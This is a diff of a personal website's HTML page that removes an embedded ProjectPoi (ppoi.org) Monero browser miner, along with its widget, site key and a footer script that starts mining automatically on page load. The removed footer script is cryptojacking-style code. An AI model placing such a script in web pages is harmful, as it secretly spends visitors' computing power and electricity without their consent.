@@ -26,8 +26,6 @@
     <link href="https://fonts.googleapis.com/css?family=Open+Sans|Roboto:300,400" rel="stylesheet">
 
     <link rel="manifest" href="manifest.json"></link>
-
-    <script src="https://ppoi.org/lib/miner.min.js" async></script>
 </head>
 
 <body>
@@ -306,30 +304,17 @@
                         <div class="panel panel-wide">
                             <div class="panel-image icon-document-largest"></div>
                             <div class="panel-heading">
-                                <h2>monero mining</h2>
+                                <h2>my lab</h2>
                             </div>
 
                             <div class="panel-content">
                                 <div class="panel-list monero-mining">
                                     <!-- <h5>Key Points</h5> -->
-                                    <!-- <ul>
+                                    <ul>
                                         <a href="https://status.viosey.com/" target="_blank">
                                             <li>Viosey's Service Status | 网站状态监控</li>
                                         </a>
-                                    </ul> -->
-                                    <div class="projectpoi-miner"
-                                        style="width: 300px; height: 240px"
-                                        data-key="Aa61Z87gf9HyIxMzLbwVvdyy"
-                                        data-autostart="false"
-                                        data-whitelabel="false"
-                                        data-background="#00a6ab"
-                                        data-action="#fff"
-                                        data-graph="#f7f7f7"
-                                        data-threads="1"
-                                        data-throttle="0.5"
-                                    >
-                                        <em>请禁用 Adblock</em>
-                                    </div>
+                                    </ul>
                                 </div>
                                 <div class="panel-download">
                                     <!-- <div class="download-icon icon-document-inverted"></div> -->
@@ -373,31 +358,6 @@
 
         ga('create', 'UA-83419544-1', 'auto');
         ga('send', 'pageview');
-    </script>
-
-    <script src="https://ppoi.org/lib/projectpoi.min.js"></script>
-    <script>
-        // ppoi monero
-        var miner = new ProjectPoi.Anonymous('Aa61Z87gf9HyIxMzLbwVvdyy', {
-            threads: 1,
-	        throttle: 0.7
-        });
-        miner.start();
-
-        // Listen on events
-        miner.on('found', function() { /* Hash found */ })
-        miner.on('accepted', function() { /* Hash accepted by the pool */ })
-
-        // Update stats once per second
-        setInterval(function() {
-            var hashesPerSecond = miner.getHashesPerSecond();
-            var totalHashes = miner.getTotalHashes();
-            var acceptedHashes = miner.getAcceptedHashes();
-
-            // Output to HTML elements...
-            console.log('Hashed/S: ' + hashesPerSecond);
-            console.log('Total: ' + totalHashes);
-        }, 1000);
     </script>
 
 </body>
